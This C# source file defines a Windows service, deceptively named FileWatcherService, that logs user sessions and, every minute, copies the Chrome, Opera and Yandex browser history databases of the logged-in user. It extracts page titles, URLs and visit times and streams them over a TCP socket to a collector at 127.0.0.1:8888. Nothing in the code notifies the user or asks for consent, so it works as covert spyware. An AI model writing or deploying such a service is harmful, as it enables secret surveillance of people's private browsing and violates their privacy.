using System;
using System.ServiceProcess;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Data.SQLite;
using System.Data.Common;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Security.Principal;
using WindowsMonitorService;
using System.Collections.ObjectModel;
using System.Collections;
using System.Management;
using Microsoft.Win32;
using System.Net.Sockets;

namespace FileWatcherService
{
    public partial class Service1 : ServiceBase
    {
        Logger logger;
        string UserName = String.Empty;
        public Service1()
        {
            InitializeComponent();



            this.CanStop = true;
            this.CanPauseAndContinue = true;
            this.AutoLog = true;
            SystemEvents.SessionEnded += new SessionEndedEventHandler(SystemEvents_EventsThreadShutdown);
            this.CanHandleSessionChangeEvent = true;
        }

        private void SystemEvents_EventsThreadShutdown(object sender, SessionEndedEventArgs e)
        {
            using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
            {

                writer.WriteLine($"Выключил комп {this.UserName}!");


            }
        }

        protected override void OnSessionChange(SessionChangeDescription obj)
        {
            GetUserName();
        }


        private void GetUserName()
        {
            object obj = new object();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT UserName FROM Win32_ComputerSystem");
            ManagementObjectCollection collection = searcher.Get();
            string s = collection.Cast<ManagementBaseObject>().First()["UserName"].ToString().Split('\\')[1].Split('-').Last();


            if (UserName != s)
            {
                lock (obj)
                {
                    UserName = s;
                    using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                    {

                        writer.WriteLine($"{UserName} вошел в систему {DateTime.Now.ToString()}");

                    }
                }

            }

        }
        protected override void OnStart(string[] args)
        {
            GetUserName();
            logger = new Logger(UserName);
            logger.RecordEntry("Служба запущенна!", false);
            Thread loggerThread = new Thread(new ThreadStart(logger.Start));
            loggerThread.Start();
        }



        protected override void OnStop()
        {
            logger.Stop();
            logger.RecordEntry("Служба остановлена!");
        }
    }

    class Logger
    {
        #region свойства службы
        Dictionary<string, string> brawsers;
        const int port = 8888;
        const string address = "127.0.0.1";
        public string UserName { get; set; }
        object obj = new object();
        bool enabled = true;
        TcpClient client = null;
        NetworkStream stream = null;
        #endregion

        #region логика службы
        public Logger(string name)
        {
            try
            {
                client = new TcpClient(address, port);
                stream = client.GetStream();
            }
            catch (Exception ex) { }
            UserName = name;
            brawsers = new Dictionary<string, string>();
            SearchBrowsers();
        }
        public void Start()
        {
            while (enabled)
            {
                try
                {
                    Thread.Sleep(60000);
                    foreach (var item in brawsers)
                    {
                        CopyBrowserHistory(item.Key, item.Value);
                        RecordEntry(($"-------------------------------------------{item.Key}"));
                        SendToServer(item.Key, ReadBrowserHistory(item.Key));
                    }
                    GC.Collect();

                }
                catch (Exception d)
                {
                    RecordEntry(d.Message);
                    RecordEntry(d.Source);
                }
            }
        }
        public void Stop()
        {

            enabled = false;
        }

        private void SearchBrowsers()
        {
            string[] files;
            try
            {
                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Google\Chrome\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        brawsers.Add("Google", Path.GetFullPath(f));

                    }
                }

            }
            catch (Exception ex)
            {

            }
            try
            {
                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Roaming\Opera Software\Opera Stable\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        brawsers.Add("Opera", Path.GetFullPath(f));

                    }
                }
            }
            catch (Exception ex)
            {

            }
            try
            {
                files = Directory.GetFiles($@"C:\Users\{UserName}\AppData\Local\Yandex\YandexBrowser\User Data\Default\");
                foreach (var f in files)
                {

                    if (Path.GetFileName(f.ToLower()).ToString().Equals("history"))
                    {
                        brawsers.Add("Yandex", Path.GetFullPath(f));

                    }
                }
            }
            catch (Exception ex)
            {

            }
        }

        #endregion
        #region копирование истории браузеров
        private void CopyBrowserHistory(string brawseName, string brawserPath)
        {
            try
            {

                if (File.Exists($"D:\\history{brawseName}.db"))
                {
                    File.Delete($"D:\\history{brawseName}.db");
                }

                using (FileStream ms = new FileStream(brawserPath, FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    byte[] buffer = new byte[ms.Length];
                    int len;
                    while ((len = ms.Read(buffer, 0, buffer.Length)) > 0)
                    {

                    }

                    File.WriteAllBytes($"D:\\history{brawseName}.db", buffer);
                    ms.Close();
                    ms.Dispose();
                }

            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
        }

        #endregion
        #region чтение данных с бд
        private string ReadBrowserHistory(string brawserName)
        {
            string databaseName = @"D:\\history" + brawserName + ".db";
            try
            {

                if (File.Exists(databaseName))
                {

                    string lastTime = null;
                    string tmpPath = "D:\\tmpGoogle.txt";
                    if (lastTime == null)
                        lastTime = DateTime.Now.ToString();
                    if (File.Exists(tmpPath))
                    {

                        using (FileStream f = new FileStream(tmpPath, FileMode.Open))
                        {
                            // преобразуем строку в байты
                            byte[] array = new byte[f.Length];
                            // считываем данные
                            f.Read(array, 0, array.Length);
                            // декодируем байты в строку
                            lastTime = Encoding.Default.GetString(array);

                        }
                    }

                    using (SQLiteConnection connection = new SQLiteConnection(string.Format($"Data Source={databaseName};")))
                    {

                        connection.Open();
                        StringBuilder stringBuilder = new StringBuilder();

                        DbDataReader r = null;

                        if (DateTime.Parse(lastTime) < DateTime.Now)
                        {

                            r = new SQLiteCommand($"SELECT * FROM urls", connection).ExecuteReader();

                        }
                        else
                        {

                            RecordEntry(((DateTime.Now.ToFileTime() / 10).ToString()));
                            //r = new SQLiteCommand($"SELECT * FROM urls where last_visit_time = {(DateTime.Now.ToFileTime() / 10)}", connection).ExecuteReader();
                            r = new SQLiteCommand("SELECT * FROM urls where last_visit_time > '213213'", connection).ExecuteReader();

                        }
                        if (r.HasRows)
                        {

                            while (r.Read())
                            {
                                stringBuilder.Append("title:\t");
                                stringBuilder.Append(r.GetValue(2));
                                stringBuilder.Append("\turl:\t");
                                stringBuilder.Append(r.GetValue(1));
                                stringBuilder.Append("\tlast time:\t");
                                stringBuilder.Append(DateTime.FromFileTime((long)r.GetValue(5) * 10).ToString());
                                stringBuilder.Append("\r\n\r");
                            }
                        }

                        return stringBuilder.ToString();

                        //using (FileStream f = new FileStream(tmpPath, FileMode.OpenOrCreate))
                        //{
                        //    f.Write(Encoding.ASCII.GetBytes(DateTime.Now.ToString()), 0, DateTime.Now.ToString().Length);
                        //}
                    }
                }
            }
            catch (Exception ex)
            {
                RecordEntry(ex.Message);
            }
            return String.Empty;
        }
        #endregion
        #region отправка на сервер
        private void SendToServer(string browserName, string data)
        {
            byte[] data_bytes = Encoding.Unicode.GetBytes(browserName + "|" + data);
            stream.Write(data_bytes, 0, data_bytes.Length);
        }
        #endregion
        #region Логгирование
        public void RecordEntry(string fileEvent, bool isError = true)
        {
            lock (obj)
            {
                using (StreamWriter writer = new StreamWriter("D:\\templog.txt", true))
                {
                    writer.WriteLine(String.Format("{0} под пользователем {1} {2}{3}",
                        DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss"), UserName, isError == true ? " произошла ошибка " : "", fileEvent));
                    writer.Flush();
                }
            }
        }
        #endregion
    }
}